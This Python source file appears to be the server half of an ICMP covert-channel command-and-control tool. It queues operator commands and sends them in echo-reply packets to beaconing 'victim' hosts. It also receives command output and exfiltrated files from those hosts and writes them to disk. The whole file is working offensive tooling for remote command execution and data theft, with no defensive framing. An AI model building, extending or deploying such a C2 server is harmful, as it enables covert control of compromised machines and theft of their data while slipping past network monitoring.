
from icmp_c2_modules import *

commands_que = {}
opened_fd = ""

def commands_input():
    global commands_que
    while True:
        if not commands_que:
            words = input("\nEnter type and command (ex: run ls):\n").split ()
            key = words[0]                      #extract the first word as key
            value = ' '.join(words[1:])         # extract all the rest as value
            commands_que = {key: value}   
            print(commands_que)

def send_command(ip_adr,id_type):
    global commands_que
    if not commands_que:
        return
    print("commands_que:")
    prefix = next(iter(commands_que))           
    print("prefix is: " + prefix)
    command_name = commands_que[prefix]
    print("command is: " + command_name)
    if prefix == RUN_MODEL:
        prefix = RUN
    elif prefix == SEND_MODEL:
        prefix = FILE
    bin_command = bytes(command_name.encode())
    print(bin_command)

    pkt_no_data = IP(dst=ip_adr)/ICMP(type="echo-reply",id=id_type)
    combined = prefix + bin_command
    pkt_send(pkt_no_data,combined,0)

    commands_que = ""
        
    
def parse_packet(packet):
    global opened_fd
    print("i am in parse")
    if Raw in packet:
        victim_ip = packet[IP].src
        id_packet = get_packet_id(packet)
        prefix_packet = check_prefix(packet)     
        data_recieved = extract_data(packet)
        print(prefix_packet)
        if prefix_packet == BEACON:
            
            send_command(victim_ip,id_packet)                 # check if there is a command in the queue and send if there is
      
        elif prefix_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
            opened_fd = open_file(LOG_OUTPUT)
            write_to_file(opened_fd,data_recieved)  # write only the name of the command the the output commands log
        
        elif prefix_packet == BEGIN_FILE:             # a packet that tells the server to prepare; name of the file in the data extracted
            file_name = os.path.basename(data_recieved)
            opened_fd = open_file(file_name)
            
        elif prefix_packet == IN_TRANSFER:
            write_to_file(opened_fd,data_recieved)  # write the content to the opened fd
            
        elif prefix_packet == EF:                     # a packet that tells the server that client has finished transferring
            close_file(opened_fd)
            opened_fd = ""
            print("transer complete")
            
                        
def server_listen():
    sniff_pkt(ICMP_REQUEST,parse_packet)
    
if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)

    enter_command_thread = threading.Thread(target=commands_input)
    enter_command_thread.start()

    print("start listening")
    server_listen()    # Start sniffing packets





